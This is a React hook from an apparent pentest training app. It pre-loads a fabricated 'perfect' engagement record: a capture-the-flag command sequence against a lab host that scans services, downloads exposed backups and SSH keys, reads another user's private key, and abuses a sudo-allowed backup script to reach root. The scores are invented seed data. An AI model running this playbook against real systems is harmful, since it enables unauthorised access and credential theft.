import { useEffect } from 'react';
import { useCertificationStore } from '@/store/certification-store';

/**
 * Initialize certification tracking with completed engagements
 * This runs once on app load to pre-populate historical training data
 */
export function useInitializeCertificationHistory() {
  const certStore = useCertificationStore();

  useEffect(() => {
    const initializeHistory = async () => {
      // Check if already initialized
      if (certStore.completed_simulations > 0) {
        return; // Already has data, skip initialization
      }

      // Add the Internal Documentation Portal engagement (beginner, 2 flags, 0 hints)
      const internalDocsEngagement = {
        difficulty: 'beginner' as const,
        commands: [
          // Reconnaissance phase
          { command: 'nmap -p- 10.10.10.24', phase: 'reconnaissance', correct: true },
          { command: 'nmap -sV -O -p 22,80,3306 10.10.10.24', phase: 'reconnaissance', correct: true },
          
          // Enumeration phase
          { command: 'gobuster dir -u http://10.10.10.24 -w /usr/share/seclists/dirb/common.txt', phase: 'enumeration', correct: true },
          { command: 'nikto -h http://10.10.10.24', phase: 'enumeration', correct: true },
          { command: 'curl http://10.10.10.24/config/database.php', phase: 'enumeration', correct: true },
          { command: 'curl http://10.10.10.24/var/backups/mysql/', phase: 'enumeration', correct: true },
          
          // Initial Access phase
          { command: 'wget http://10.10.10.24/backup/internal_docs_20240114.sql.gz', phase: 'initial_access', correct: true },
          { command: 'mysql -h 10.10.10.24 -u doc_admin -p', phase: 'initial_access', correct: true },
          { command: 'SHOW DATABASES;', phase: 'initial_access', correct: true },
          { command: 'USE internal_docs;', phase: 'initial_access', correct: true },
          { command: 'SHOW TABLES;', phase: 'initial_access', correct: true },
          { command: 'SELECT * FROM users;', phase: 'initial_access', correct: true },
          { command: 'SELECT * FROM documents WHERE title LIKE "%flag%" OR content LIKE "%flag%";', phase: 'initial_access', correct: true },
          { command: 'wget http://10.10.10.24/opt/backups/id_rsa', phase: 'initial_access', correct: true },
          { command: 'chmod 600 id_rsa', phase: 'initial_access', correct: true },
          { command: 'ssh -i id_rsa jenkins@10.10.10.24', phase: 'initial_access', correct: true },
          
          // Privilege Escalation phase
          { command: 'id', phase: 'privilege_escalation', correct: true },
          { command: 'groups', phase: 'privilege_escalation', correct: true },
          { command: 'find /home -type f -readable 2>/dev/null | grep -E ".ssh|user.txt"', phase: 'privilege_escalation', correct: true },
          { command: 'find /home/sarah/.ssh/ -type f 2>/dev/null', phase: 'privilege_escalation', correct: true },
          { command: 'cat /home/sarah/.ssh/id_rsa', phase: 'privilege_escalation', correct: true },
          { command: 'ssh sarah@10.10.10.24', phase: 'privilege_escalation', correct: true },
          { command: 'cat /home/sarah/user.txt', phase: 'privilege_escalation', correct: true },
          { command: 'sudo -l', phase: 'privilege_escalation', correct: true },
          { command: 'ls -la /usr/bin/backup-script', phase: 'privilege_escalation', correct: true },
          { command: 'cat /usr/bin/backup-script', phase: 'privilege_escalation', correct: true },
          { command: 'sudo /usr/bin/backup-script /root /var/backups/system/', phase: 'privilege_escalation', correct: true },
          { command: 'ls -la /var/backups/system/', phase: 'privilege_escalation', correct: true },
          { command: 'tar -xzf /var/backups/system/root_backup_20240115_1037.tar.gz root/root.txt', phase: 'privilege_escalation', correct: true },
          
          // Post Exploitation phase
          { command: 'cat root/root.txt', phase: 'post_exploitation', correct: true },
        ],
        evaluation: {
          reconScore: 95, // Excellent - used both port scan and version detection
          scanningScore: 90, // Great - comprehensive port scanning
          enumerationScore: 98, // Outstanding - found all critical files and configs
          exploitationScore: 92, // Excellent - leveraged exposed credentials and SSH keys
          privescScore: 95, // Perfect - used backup group permissions elegantly
          methodologyScore: 96, // Textbook PTES methodology adherence
          overallScore: 94, // Outstanding performance for beginner level
        },
        flags_captured: 2, // Both user and root flags
        hints_used: 0, // No hints used - perfect run
        missed_steps: [], // No missed steps
        domains_practiced: [
          'reconnaissance',
          'enumeration',
          'web_exploitation',
          'privilege_escalation',
          'lateral_movement',
          'password_attacks',
        ] as import('@/store/certification-store').CertificationDomain[],
      };

      console.log('Initializing certification history with Internal Documentation Portal engagement...');
      await certStore.updateAfterSimulation(internalDocsEngagement);
      console.log('Certification history initialized successfully');
    };

    initializeHistory();
  }, []);
}
